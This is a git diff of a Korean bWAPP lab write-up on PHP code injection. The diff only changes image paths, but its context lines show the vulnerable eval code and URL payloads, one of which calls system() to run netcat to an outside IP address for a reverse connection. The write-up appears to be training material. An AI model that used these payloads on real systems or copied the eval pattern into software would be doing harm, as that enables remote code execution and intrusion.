@@ -32,7 +32,7 @@ if(isset($_REQUEST["message"]))
 ?>
 ```
 ## Level - Low
-![그림 1-1](/assets/image/bwapp/php-code-injection/image.png)
+![그림 1-1](/assets/image/bwapp/injection/php-code/php-code-injection/image.png)
 
 ```php
 <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
@@ -48,7 +48,7 @@ if(isset($_REQUEST["message"]))
 /bWAPP/phpi.php?message=hello
 ```
 
-![그림 1-2](/assets/image/bwapp/php-code-injection/image2.png)
+![그림 1-2](/assets/image/bwapp/injection/php-code/php-code-injection/image2.png)
 - 입력값이 echo 명령과 합쳐지면 페이지에 출력되는것을 확인했다. 
 
 ```
@@ -56,7 +56,7 @@ if(isset($_REQUEST["message"]))
 ```
 
 - 위와 같이 php system 명령어를 인자로 넘겨줬다.
-![그림 1-3](/assets/image/bwapp/php-code-injection/image3.png)
+![그림 1-3](/assets/image/bwapp/injection/php-code/php-code-injection/image3.png)
 - system() 명령이 성공적으로 실행된 걸 확인할 수 있다.
 - 이를통해 Reverse Shell Connection또한 가능하다.
 
@@ -64,7 +64,7 @@ if(isset($_REQUEST["message"]))
 /bWAPP/phpi.php?message=system(%27nc%20192.168.146.137%205252%27)
 ```
 
-![그림 1-4](/assets/image/bwapp/php-code-injection/image4.png)
+![그림 1-4](/assets/image/bwapp/injection/php-code/php-code-injection/image4.png)
 - 성공적으로 Reverse Connection이 맺어진 걸 볼 수 있다.
 
 ## Level - Medium & High
@@ -81,4 +81,4 @@ if(isset($_REQUEST["message"]))
 /bWAPP/phpi.php?message=phpinfo()
 ```
 
-![그림 1-5](/assets/image/bwapp/php-code-injection/image5.png)
+![그림 1-5](/assets/image/bwapp/injection/php-code/php-code-injection/image5.png)
